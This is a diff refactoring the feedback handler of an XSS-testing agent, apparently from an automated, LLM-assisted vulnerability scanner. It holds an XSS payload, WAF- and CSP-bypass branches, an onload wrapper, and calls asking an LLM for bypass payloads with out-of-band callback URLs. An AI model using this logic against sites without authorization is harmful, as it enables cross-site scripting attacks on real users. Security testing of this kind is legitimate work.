@@ -2667,18 +2667,18 @@ Return JSON:
         return findings
     
     async def handle_validation_feedback(
-        self, 
+        self,
         feedback: ValidationFeedback
     ) -> Optional[Dict[str, Any]]:
         """
         Recibe feedback del AgenticValidator y genera una variante adaptada.
-        
+
         Este método se llama cuando el validador no pudo ejecutar un payload
         y necesita una variante basada en el contexto observado.
-        
+
         Args:
             feedback: Información detallada sobre por qué falló el payload
-            
+
         Returns:
             Diccionario con el nuevo payload y metadata, o None si no hay variante
         """
@@ -2686,90 +2686,151 @@ Return JSON:
             f"[XSSAgent] Received validation feedback for {feedback.parameter}: "
             f"reason={feedback.failure_reason.value}"
         )
-        
+
         original = feedback.original_payload
-        variant = None
-        method = "feedback_adaptation"
-        
-        # ===========================================
-        # Estrategia según la razón del fallo
-        # ===========================================
-        
-        if feedback.failure_reason == FailureReason.WAF_BLOCKED:
-            # El WAF bloqueó el payload - usar encoding avanzado
-            logger.info("[XSSAgent] WAF detected, trying encoded variants")
-            encoded_variants = await self._get_waf_optimized_payloads([original], max_variants=1)
-            if encoded_variants and encoded_variants[0] != original:
-                variant = encoded_variants[0]
-                method = "waf_bypass"
-        
-        elif feedback.failure_reason == FailureReason.CONTEXT_MISMATCH:
-            # El contexto HTML no era el esperado
-            logger.info(f"[XSSAgent] Context mismatch, adapting to: {feedback.detected_context}")
-            variant = self._adapt_to_context(original, feedback.detected_context)
-            method = "context_adaptation"
-        
-        elif feedback.failure_reason == FailureReason.ENCODING_STRIPPED:
-            # Caracteres fueron filtrados
-            logger.info(f"[XSSAgent] Chars stripped: {feedback.stripped_chars}")
-            variant = self._encode_stripped_chars(original, feedback.stripped_chars)
-            method = "char_encoding"
-        
-        elif feedback.failure_reason == FailureReason.PARTIAL_REFLECTION:
-            # Solo parte del payload se reflejó - simplificar
-            logger.info("[XSSAgent] Partial reflection, trying simpler payload")
-            variant = "<img src=x onerror=alert(1)>"
-            method = "simplification"
-        
-        elif feedback.failure_reason == FailureReason.CSP_BLOCKED:
-            # CSP bloqueó - intentar bypass
-            logger.info("[XSSAgent] CSP blocked, trying CSP bypass")
-            variant = self._generate_csp_bypass_payload()
-            method = "csp_bypass"
-        
-        elif feedback.failure_reason in [FailureReason.TIMING_ISSUE, FailureReason.DOM_NOT_READY]:
-            # Problema de timing - añadir delays o eventos
-            logger.info("[XSSAgent] Timing issue, adding load event")
-            variant = f"<body onload=\"{original.replace('<script>', '').replace('</script>', '')}\">"
-            method = "timing_fix"
-        
-        elif feedback.failure_reason == FailureReason.NO_EXECUTION:
-            # No ejecutó sin razón clara - probar técnica diferente
-            logger.info("[XSSAgent] No execution, trying different technique")
-            # Usar LLM para generar alternativa
-            llm_result = await self._llm_generate_bypass(
-                original, 
-                feedback.reflected_portion or "", 
-                self.interactsh.get_url("xss_agent_bypass") if self.interactsh else ""
-            )
-            if llm_result:
-                variant = llm_result.get('payload')
-                method = "llm_alternative"
-        
-        # Si no generamos variante con las estrategias específicas, usar LLM
+
+        # Try specific strategy for failure reason
+        variant, method = await self._generate_variant_for_reason(feedback, original)
+
+        # Fallback to LLM if no variant generated
         if not variant or variant == original:
-            logger.info("[XSSAgent] Falling back to LLM generation")
-            llm_result = await self._llm_generate_bypass(
-                original,
-                feedback.reflected_portion or "",
-                self.interactsh.get_url("xss_agent_fallback") if self.interactsh else ""
-            )
-            if llm_result:
-                variant = llm_result.get('payload')
-                method = "llm_fallback"
-        
-        # Verificar que la variante sea diferente al original y no ya probada
-        if variant and variant != original and not feedback.was_variant_tried(variant):
-            logger.info(f"[XSSAgent] Generated variant via {method}: {variant[:60]}...")
-            return {
-                "payload": variant,
-                "method": method,
-                "parent_payload": original,
-                "adaptation_reason": feedback.failure_reason.value
-            }
-        
-        logger.warning("[XSSAgent] Could not generate unique variant")
-        return None
+            variant, method = await self._generate_llm_fallback_variant(feedback, original)
+
+        # Guard: variant must be unique and different from original
+        if not variant:
+            logger.warning("[XSSAgent] Could not generate unique variant")
+            return None
+
+        if variant == original:
+            logger.warning("[XSSAgent] Generated variant same as original")
+            return None
+
+        if feedback.was_variant_tried(variant):
+            logger.warning("[XSSAgent] Generated variant already tried")
+            return None
+
+        logger.info(f"[XSSAgent] Generated variant via {method}: {variant[:60]}...")
+        return {
+            "payload": variant,
+            "method": method,
+            "parent_payload": original,
+            "adaptation_reason": feedback.failure_reason.value
+        }
+
+    async def _generate_variant_for_reason(
+        self,
+        feedback: ValidationFeedback,
+        original: str
+    ) -> Tuple[Optional[str], str]:
+        """Generate variant based on specific failure reason."""
+        reason = feedback.failure_reason
+
+        # Guard: WAF blocked
+        if reason == FailureReason.WAF_BLOCKED:
+            return await self._handle_waf_blocked(original)
+
+        # Guard: Context mismatch
+        if reason == FailureReason.CONTEXT_MISMATCH:
+            return self._handle_context_mismatch(feedback, original)
+
+        # Guard: Encoding stripped
+        if reason == FailureReason.ENCODING_STRIPPED:
+            return self._handle_encoding_stripped(feedback, original)
+
+        # Guard: Partial reflection
+        if reason == FailureReason.PARTIAL_REFLECTION:
+            return self._handle_partial_reflection()
+
+        # Guard: CSP blocked
+        if reason == FailureReason.CSP_BLOCKED:
+            return self._handle_csp_blocked()
+
+        # Guard: Timing issues
+        if reason in [FailureReason.TIMING_ISSUE, FailureReason.DOM_NOT_READY]:
+            return self._handle_timing_issue(original)
+
+        # Guard: No execution
+        if reason == FailureReason.NO_EXECUTION:
+            return await self._handle_no_execution(feedback, original)
+
+        return None, "unknown"
+
+    async def _handle_waf_blocked(self, original: str) -> Tuple[Optional[str], str]:
+        """Handle WAF blocked scenario."""
+        logger.info("[XSSAgent] WAF detected, trying encoded variants")
+        encoded_variants = await self._get_waf_optimized_payloads([original], max_variants=1)
+        if encoded_variants and encoded_variants[0] != original:
+            return encoded_variants[0], "waf_bypass"
+        return None, "waf_bypass"
+
+    def _handle_context_mismatch(
+        self,
+        feedback: ValidationFeedback,
+        original: str
+    ) -> Tuple[Optional[str], str]:
+        """Handle context mismatch scenario."""
+        logger.info(f"[XSSAgent] Context mismatch, adapting to: {feedback.detected_context}")
+        variant = self._adapt_to_context(original, feedback.detected_context)
+        return variant, "context_adaptation"
+
+    def _handle_encoding_stripped(
+        self,
+        feedback: ValidationFeedback,
+        original: str
+    ) -> Tuple[Optional[str], str]:
+        """Handle encoding stripped scenario."""
+        logger.info(f"[XSSAgent] Chars stripped: {feedback.stripped_chars}")
+        variant = self._encode_stripped_chars(original, feedback.stripped_chars)
+        return variant, "char_encoding"
+
+    def _handle_partial_reflection(self) -> Tuple[str, str]:
+        """Handle partial reflection scenario."""
+        logger.info("[XSSAgent] Partial reflection, trying simpler payload")
+        return "<img src=x onerror=alert(1)>", "simplification"
+
+    def _handle_csp_blocked(self) -> Tuple[Optional[str], str]:
+        """Handle CSP blocked scenario."""
+        logger.info("[XSSAgent] CSP blocked, trying CSP bypass")
+        variant = self._generate_csp_bypass_payload()
+        return variant, "csp_bypass"
+
+    def _handle_timing_issue(self, original: str) -> Tuple[str, str]:
+        """Handle timing issue scenario."""
+        logger.info("[XSSAgent] Timing issue, adding load event")
+        variant = f"<body onload=\"{original.replace('<script>', '').replace('</script>', '')}\">"
+        return variant, "timing_fix"
+
+    async def _handle_no_execution(
+        self,
+        feedback: ValidationFeedback,
+        original: str
+    ) -> Tuple[Optional[str], str]:
+        """Handle no execution scenario."""
+        logger.info("[XSSAgent] No execution, trying different technique")
+        llm_result = await self._llm_generate_bypass(
+            original,
+            feedback.reflected_portion or "",
+            self.interactsh.get_url("xss_agent_bypass") if self.interactsh else ""
+        )
+        if llm_result:
+            return llm_result.get('payload'), "llm_alternative"
+        return None, "llm_alternative"
+
+    async def _generate_llm_fallback_variant(
+        self,
+        feedback: ValidationFeedback,
+        original: str
+    ) -> Tuple[Optional[str], str]:
+        """Generate variant using LLM fallback."""
+        logger.info("[XSSAgent] Falling back to LLM generation")
+        llm_result = await self._llm_generate_bypass(
+            original,
+            feedback.reflected_portion or "",
+            self.interactsh.get_url("xss_agent_fallback") if self.interactsh else ""
+        )
+        if llm_result:
+            return llm_result.get('payload'), "llm_fallback"
+        return None, "llm_fallback"
 
     def _extract_js_code(self, payload: str) -> str:
         """Extract JavaScript execution code from payload."""
